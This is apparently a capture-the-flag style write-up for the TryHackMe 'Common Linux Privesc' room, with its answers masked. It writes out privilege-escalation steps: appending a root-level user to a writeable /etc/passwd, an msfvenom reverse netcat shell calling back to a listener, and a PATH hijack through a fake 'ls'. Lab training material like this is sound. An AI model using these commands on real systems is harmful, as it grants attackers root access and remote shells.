<!-- TOC -->

- [Common Linux Privesc](#common-linux-privesc)
    - [Enumeration](#enumeration)
    - [Abusing SUID/GUID Files](#abusing-suidguid-files)
    - [Exploiting Writeable /etc/passwd](#exploiting-writeable-etcpasswd)
    - [Escaping Vi Editor](#escaping-vi-editor)
    - [Exploiting Crontab](#exploiting-crontab)
    - [Exploiting PATH Variable](#exploiting-path-variable)

<!-- /TOC -->

# Common Linux Privesc

[Common Linux Privesc Room](https://tryhackme.com/room/commonlinuxprivesc)

A room explaining common Linux privilege escalation

| Title | IP Address |
| :---- | :---- |
| poloprivescfinal | `1*.**.***.***` |

## Enumeration

```bash
hostname
```

> `p******`

```bash
cat /etc/passwd | grep user[0-9] | wc -l
```

> `*`

```bash
cat /etc/shells
```

> `*`

```bash
cat /etc/crontab
```

> `a*********.**`

```bash
find / -type f -perm -g=w 2>/dev/null | grep -E '^/.{3}/.{6}$'
```

> `/***/******`

## Abusing SUID/GUID Files

```bash
readlink -f shell 
```

> `/****/*****/*****`

## Exploiting Writeable /etc/passwd

```bash
openssl passwd -1 -salt new
```

> `$1$new$p****EKU*H**H*R**N**S*`

```bash
echo 'new:$1$new$p****EKU*H**H*R**N**S*:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Using `new:123`

```bash
su new
```

##  Escaping Vi Editor

```bash
sudo -l
```

> `(root) N*******: /usr/bin/vi`

## Exploiting Crontab

LHOST:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```

```bash
find / -type f -name autoscript.sh 2>/dev/null
```

> `/****/*****/D******`

## Exploiting PATH Variable

```bash
cd /tmp
echo "/***/****" > ls
c**** +x ls
cd
./script
```
